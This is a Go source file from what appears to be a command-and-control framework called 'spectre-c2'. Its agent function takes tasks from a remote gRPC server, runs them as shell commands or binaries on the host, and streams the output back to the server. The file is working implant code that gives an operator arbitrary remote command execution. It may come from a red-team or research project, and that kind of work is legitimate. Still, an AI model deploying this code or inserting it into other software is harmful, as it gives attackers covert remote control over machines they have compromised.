package agent

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"log"
	"os/exec"
	"time"

	pb "github.com/sbu/spectre-c2/pkg/proto"
	"google.golang.org/grpc"
)

// executeAndStream runs a TaskRequest, streaming stdout/stderr line-by-line
// to the server via the AgentService.StreamTaskOutput RPC.
//
// The function honours task.TimeoutSec (defaulting to 300 seconds if zero).
// Both stdout and stderr are captured concurrently and forwarded as individual
// chunk messages.  A final message with IsDone=true and ExitCode is sent when
// the process terminates.
func executeAndStream(
	ctx context.Context,
	task *pb.TaskRequest,
	agentID string,
	conn *grpc.ClientConn,
) {
	client := pb.NewAgentServiceClient(conn)

	timeout := time.Duration(task.TimeoutSec) * time.Second
	if timeout <= 0 {
		timeout = 300 * time.Second
	}
	taskCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	stream, err := client.StreamTaskOutput(taskCtx)
	if err != nil {
		log.Printf("[exec] open stream for %s: %v", task.TaskId, err)
		return
	}

	sendChunk := func(data []byte, isStderr bool) {
		msg := &pb.TaskOutput{
			TaskId:    task.TaskId,
			AgentId:   agentID,
			Chunk:     data,
			IsStderr:  isStderr,
			Timestamp: time.Now().UnixMilli(),
		}
		if sendErr := stream.Send(msg); sendErr != nil {
			log.Printf("[exec] send chunk %s: %v", task.TaskId, sendErr)
		}
	}

	// Build the command.  args[0] is the binary; args[1:] are arguments.
	if len(task.Args) == 0 {
		sendChunk([]byte("no args provided\n"), true)
		_ = finalise(stream, task.TaskId, agentID, 1)
		return
	}

	var cmdBin string
	var cmdArgs []string

	// For TASK_EXEC we use /bin/sh -c so that pipes, redirects, etc work.
	if task.Type == pb.TaskType_TASK_EXEC {
		cmdBin = "/bin/sh"
		cmdArgs = append([]string{"-c"}, task.Args...)
	} else {
		cmdBin = task.Args[0]
		cmdArgs = task.Args[1:]
	}

	cmd := exec.CommandContext(taskCtx, cmdBin, cmdArgs...)

	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		sendChunk([]byte(fmt.Sprintf("stdout pipe: %v\n", err)), true)
		_ = finalise(stream, task.TaskId, agentID, 1)
		return
	}
	stderrPipe, err := cmd.StderrPipe()
	if err != nil {
		sendChunk([]byte(fmt.Sprintf("stderr pipe: %v\n", err)), true)
		_ = finalise(stream, task.TaskId, agentID, 1)
		return
	}

	if err := cmd.Start(); err != nil {
		sendChunk([]byte(fmt.Sprintf("start: %v\n", err)), true)
		_ = finalise(stream, task.TaskId, agentID, 1)
		return
	}

	// Stream stdout and stderr concurrently.
	done := make(chan struct{}, 2)

	streamPipe := func(pipe io.Reader, isStderr bool) {
		scanner := bufio.NewScanner(pipe)
		scanner.Buffer(make([]byte, 64*1024), 64*1024)
		for scanner.Scan() {
			line := scanner.Bytes()
			buf := make([]byte, len(line)+1)
			copy(buf, line)
			buf[len(line)] = '\n'
			sendChunk(buf, isStderr)
		}
		done <- struct{}{}
	}

	go streamPipe(stdoutPipe, false)
	go streamPipe(stderrPipe, true)

	// Wait for both pipes to drain.
	<-done
	<-done

	exitCode := 0
	if err := cmd.Wait(); err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = 1
		}
	}

	_ = finalise(stream, task.TaskId, agentID, exitCode)
}

// finalise sends the terminal TaskOutput message with IsDone=true, then
// closes the send side and waits for the server's TaskAck.
func finalise(stream pb.AgentService_StreamTaskOutputClient, taskID, agentID string, exitCode int) error {
	err := stream.Send(&pb.TaskOutput{
		TaskId:    taskID,
		AgentId:   agentID,
		IsDone:    true,
		ExitCode:  int32(exitCode),
		Timestamp: time.Now().UnixMilli(),
	})
	if err != nil {
		log.Printf("[exec] send done %s: %v", taskID, err)
		return err
	}
	// Signal EOF on the send side, then read the server's TaskAck.
	if closeErr := stream.CloseSend(); closeErr != nil {
		log.Printf("[exec] close send %s: %v", taskID, closeErr)
	}
	if _, recvErr := stream.Recv(); recvErr != nil && recvErr != io.EOF {
		log.Printf("[exec] recv ack %s: %v", taskID, recvErr)
	}
	return err
}
